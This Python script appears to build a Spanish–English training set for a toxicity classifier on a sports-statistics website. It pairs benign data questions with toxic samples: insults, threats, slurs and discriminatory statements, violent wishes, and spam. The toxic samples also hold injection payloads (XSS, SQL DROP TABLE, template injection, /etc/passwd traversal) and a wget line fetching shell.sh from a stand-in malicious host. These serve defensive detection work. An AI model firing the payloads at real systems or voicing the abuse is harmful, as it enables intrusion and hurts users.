"""
prepare_toxicity_data.py
========================
Genera un dataset de entrenamiento balanceado para fine-tuning del clasificador
de toxicidad unitary/multilingual-toxic-xlm-roberta.

El dataset incluye ejemplos en español e inglés, adaptados al contexto de
una web de estadísticas deportivas (DEPORTEData).

Etiquetas:
  0 = NO TÓXICO  (mensaje válido, normal)
  1 = TÓXICO     (insultos, acoso, spam, contenido inapropiado)

Ejecutar desde la raíz del proyecto:
    python scripts/prepare_toxicity_data.py
"""

from __future__ import annotations

import csv
import json
import os
import random

RANDOM_SEED = 42
OUTPUT_CSV  = "data/processed/toxicity_dataset.csv"
OUTPUT_JSON = "data/processed/toxicity_dataset.jsonl"

random.seed(RANDOM_SEED)

# ─────────────────────────────────────────────────────────────────────────────
# EJEMPLOS NO TÓXICOS  (label = 0)
# Cubren: preguntas legítimas, consultas de datos, saludos, errores de usuario
# ─────────────────────────────────────────────────────────────────────────────

NON_TOXIC_ES = [
    # Consultas sobre datos
    "¿Cuántas licencias federadas tiene la comunidad de Madrid en 2022?",
    "¿Cuál es el gasto medio por hogar en deporte en Cataluña?",
    "¿Ha aumentado el número de deportistas federados en los últimos 10 años?",
    "Muéstrame la evolución del empleo en el sector deportivo desde 2010",
    "¿Qué comunidad autónoma tiene más clubes deportivos?",
    "¿Cuántas mujeres practican deporte federado en España?",
    "¿Cómo se compara España con Alemania en práctica deportiva?",
    "¿Cuál fue el impacto del COVID en las licencias deportivas?",
    "Dame un resumen del gasto público en deporte por comunidad autónoma",
    "¿Qué deporte tiene más licencias en España en 2023?",
    "¿Cuántos árbitros federados hay en la Federación de Fútbol?",
    "¿Ha bajado el número de empresas deportivas tras la pandemia?",
    "Compara el gasto en deporte de hogares ricos y pobres",
    "¿Qué porcentaje de españoles practica deporte al menos una vez a la semana?",
    "¿Cuáles son las barreras más frecuentes para no hacer deporte?",
    "Explícame qué son los indicadores armonizados de la UE en deporte",
    "¿En qué año hubo más licencias de baloncesto en España?",
    "Muéstrame los datos de afiliación a la Seguridad Social en el sector deportivo",
    "¿Cómo ha cambiado la práctica deportiva entre jóvenes de 15 a 24 años?",
    "¿Qué es DEPORTEData?",
    # Saludos y preguntas generales
    "Hola, buenos días",
    "¿Me puedes ayudar con una consulta?",
    "No entiendo bien los datos, ¿puedes explicármelo?",
    "¿Qué puedes hacer tú?",
    "Gracias por la información",
    "¿Estos datos son fiables?",
    "¿De dónde vienen los datos que usas?",
    "¿Puedo descargar los datos en Excel?",
    "La página no carga bien, ¿qué hago?",
    "¿Tienes datos de balonmano en Asturias?",
    # Preguntas en contexto educativo
    "Estoy haciendo un trabajo sobre el deporte en España, ¿puedes ayudarme?",
    "¿Qué diferencia hay entre deporte federado y no federado?",
    "¿Puedes explicarme qué es una encuesta de hábitos deportivos?",
    "¿Tienes datos del sector deportivo a nivel municipal?",
    "¿Cuánto cuesta de media una licencia deportiva en España?",
    "¿Qué comunidad tiene la mayor tasa de práctica deportiva femenina?",
    "¿Hay datos sobre deporte adaptado o paralímpico?",
    "¿Cuáles son las tendencias del deporte escolar en España?",
    "¿Los datos incluyen el deporte universitario?",
    "¿Qué porcentaje del PIB representa el sector deportivo?",
]

NON_TOXIC_EN = [
    # Data queries in English
    "How many sports licenses are there in Spain in 2022?",
    "What is the average household spending on sports in Catalonia?",
    "Has the number of federated athletes increased over the last 10 years?",
    "Show me the employment trends in the sports sector since 2010",
    "Which region has the most sports clubs?",
    "How many women practice federated sports in Spain?",
    "How does Spain compare to Germany in sports participation?",
    "What was the impact of COVID on sports licenses?",
    "Give me a summary of public spending on sports by region",
    "Which sport has the most licenses in Spain in 2023?",
    "What percentage of Spanish people exercise at least once a week?",
    "What are the most common barriers to practicing sports?",
    "Explain what EU harmonized sports indicators are",
    "In which year were there the most basketball licenses in Spain?",
    "Show me Social Security affiliation data in the sports sector",
    "How has sports participation changed among young people aged 15 to 24?",
    "What is DEPORTEData?",
    # General/conversational in English
    "Hello, good morning",
    "Can you help me with a query?",
    "I don't understand the data, can you explain it?",
    "What can you do?",
    "Thank you for the information",
    "Are these data reliable?",
    "Where does the data come from?",
    "Can I download the data in Excel format?",
    "I'm working on a project about sports in Spain, can you help?",
    "What is the difference between federated and non-federated sport?",
    "Do you have data on adaptive or Paralympic sports?",
    "What percentage of GDP does the sports sector represent?",
    "How much does a sports license cost on average in Spain?",
    "Is sports participation higher among younger or older people?",
    "Are there differences in sports participation between men and women?",
    "How has household spending on sports evolved since 2005?",
    "Which region spends the most on sports per household?",
    "Do you have data on sports participation by education level?",
    "What sports have grown the most in the last decade?",
    "Can I see the raw numbers behind the charts?",
]

# ─────────────────────────────────────────────────────────────────────────────
# EJEMPLOS TÓXICOS  (label = 1)
# Cubren: insultos, amenazas, acoso, spam, contenido inapropiado, off-topic agresivo
# NOTA: Son ejemplos genéricos representativos de toxicidad online, no específicos
#       del sector deportivo. Necesarios para entrenar al classifier.
# ─────────────────────────────────────────────────────────────────────────────

TOXIC_ES = [
    # Insultos directos
    "Eres un completo idiota, esto no sirve para nada",
    "Qué estupidez de página web, inútiles",
    "Vete a la mierda con tus datos falsos",
    "Imbécil, no sabes nada de deporte",
    "Maldita basura de aplicación, que os jodan",
    "Eres un mentiroso y un fraude",
    "Esto es una mierda total, los creadores son unos burros",
    "Que te jodan a ti y a tus estadísticas",
    "Pedazo de inútil, no funciona nada",
    "Gilipollas, esto no vale para nada",
    # Amenazas
    "Os voy a denunciar a todos por inventaros los datos",
    "Ya veréis cuando llegue",
    "Vais a saber quién soy yo",
    "Os voy a hundir en las redes sociales",
    "Esperad que os enseño a mentir",
    # Acoso / discriminación
    "Las mujeres no deberían hacer deporte",
    "Los inmigrantes no merecen licencias deportivas",
    "El deporte es solo para blancos españoles de verdad",
    "Que los maricones se busquen su propia federación",
    "Los discapacitados no deberían recibir ayudas para el deporte",
    # Spam / contenido irrelevante agresivo
    "COMPRA AQUÍ SEGUIDORES INSTAGRAM 0€ HAZ CLICK",
    "GANA DINERO RÁPIDO SIN TRABAJAR ENTRA YA",
    "Pincha aquí para ver contenido prohibido gratis",
    "OFERTA LIMITADA ROPA DEPORTE -90% HOY SOLO",
    "Vendo cuentas de Twitch baratas mensaje privado",
    # Contenido violento
    "Espero que el árbitro de la final se muera",
    "Hay que destruir a esos que publican estos datos",
    "Me dan ganas de pegarle a quien haya hecho esto",
    "A ver si hay un accidente en el próximo evento deportivo",
    "Ojalá se lesionen todos los de esa federación",
    # XSS / intentos de hackeo (también son inputs maliciosos)
    "<script>alert('hacked')</script>",
    "'; DROP TABLE usuarios; --",
    "{{7*7}} admin admin",
    "../../etc/passwd",
    "javascript:void(0)",
    # Contenido inapropiado off-topic
    "Dónde puedo ver pelis porno gratis",
    "Quiero comprar sustancias ilegales, ¿me ayudas?",
    "¿Cómo hackeo la cuenta de mi ex?",
    "Enséñame armas caseras",
    "Cómo hacer para que alguien desaparezca",
]

TOXIC_EN = [
    # Direct insults
    "You are a complete idiot, this is useless",
    "What a stupid website, bunch of losers",
    "Go to hell with your fake data",
    "You know nothing about sports, moron",
    "Garbage app, the creators are absolute idiots",
    "You're a liar and a fraud",
    "This is total crap, the developers are fools",
    "Screw you and your statistics",
    "Useless piece of junk, nothing works",
    "You're an embarrassment to the analytics world",
    # Threats
    "I will report all of you for making up stats",
    "You'll see what happens when I find you",
    "Watch your backs",
    "I'll destroy your reputation on social media",
    "You'll regret publishing this garbage",
    # Harassment / discrimination
    "Women shouldn't do sports",
    "Immigrants don't deserve sports licenses",
    "Sports is only for real Spanish people",
    "Disabled people shouldn't get sports funding",
    "Gay people should have their own federation",
    # Spam
    "BUY INSTAGRAM FOLLOWERS FOR FREE CLICK HERE",
    "MAKE MONEY FAST WITHOUT WORKING CLICK NOW",
    "Click here to see forbidden content for free",
    "LIMITED OFFER SPORTS CLOTHES -90% TODAY ONLY",
    "I sell cheap Twitch accounts DM me",
    # Violent content
    "I hope the referee from the final dies",
    "We should destroy the people who publish this data",
    "I feel like hitting whoever made this",
    "Hope there's an accident at the next sports event",
    "I wish all those federation members would get injured",
    # Injection attempts
    "<script>document.cookie='stolen'</script>",
    "' OR 1=1; DROP TABLE data; --",
    "admin' --",
    "{{config.__class__.__init__.__globals__}}",
    "wget http://malicious.site/shell.sh",
    # Inappropriate off-topic
    "Where can I watch free adult movies",
    "I want to buy illegal substances, help me",
    "How do I hack my ex's account",
    "Show me how to make weapons at home",
    "How do I make someone disappear",
]

# ─────────────────────────────────────────────────────────────────────────────
# EDGE CASES — Ejemplos ambiguos que deben clasificarse como NO tóxicos
# (crítica constructiva, frustración, preguntas directas)
# ─────────────────────────────────────────────────────────────────────────────

EDGE_CASES_NON_TOXIC = [
    ("Esta web es muy lenta, ¿lo vais a arreglar?", 0),
    ("Los datos están desactualizados, eso es un problema", 0),
    ("No me gusta cómo está organizada la información", 0),
    ("Esto podría mejorar mucho", 0),
    ("¿Por qué no incluís datos de deporte escolar?", 0),
    ("Me parece que hay un error en los números de 2020", 0),
    ("This website is really slow, are you going to fix it?", 0),
    ("The data seems to be outdated, that's a problem", 0),
    ("I don't like how the information is organized", 0),
    ("This could be much better", 0),
    ("Why don't you include school sports data?", 0),
    ("I think there's an error in the 2020 numbers", 0),
]


# ─────────────────────────────────────────────────────────────────────────────
# CONSTRUIR Y GUARDAR EL DATASET
# ─────────────────────────────────────────────────────────────────────────────

def build_dataset() -> list[dict]:
    examples = []

    for text in NON_TOXIC_ES + NON_TOXIC_EN:
        examples.append({"text": text.strip(), "label": 0})

    for text in TOXIC_ES + TOXIC_EN:
        examples.append({"text": text.strip(), "label": 1})

    for text, label in EDGE_CASES_NON_TOXIC:
        examples.append({"text": text.strip(), "label": label})

    random.shuffle(examples)
    return examples


def print_stats(examples: list[dict]) -> None:
    n_total  = len(examples)
    n_toxic  = sum(1 for e in examples if e["label"] == 1)
    n_clean  = n_total - n_toxic
    print(f"[INFO] Total ejemplos : {n_total}")
    print(f"[INFO]   No toxicos   : {n_clean}  ({n_clean/n_total*100:.1f}%)")
    print(f"[INFO]   Toxicos      : {n_toxic} ({n_toxic/n_total*100:.1f}%)")


def main() -> None:
    os.makedirs(os.path.dirname(OUTPUT_CSV), exist_ok=True)

    examples = build_dataset()
    print_stats(examples)

    # ── CSV (compatible con pandas y scikit-learn) ─────────────────────────
    with open(OUTPUT_CSV, "w", encoding="utf-8", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=["text", "label"])
        writer.writeheader()
        writer.writerows(examples)
    print(f"[OK] CSV guardado en  : {OUTPUT_CSV}")

    # ── JSONL (compatible con Hugging Face datasets) ───────────────────────
    with open(OUTPUT_JSON, "w", encoding="utf-8") as f:
        for item in examples:
            f.write(json.dumps(item, ensure_ascii=False) + "\n")
    print(f"[OK] JSONL guardado en: {OUTPUT_JSON}")


if __name__ == "__main__":
    main()
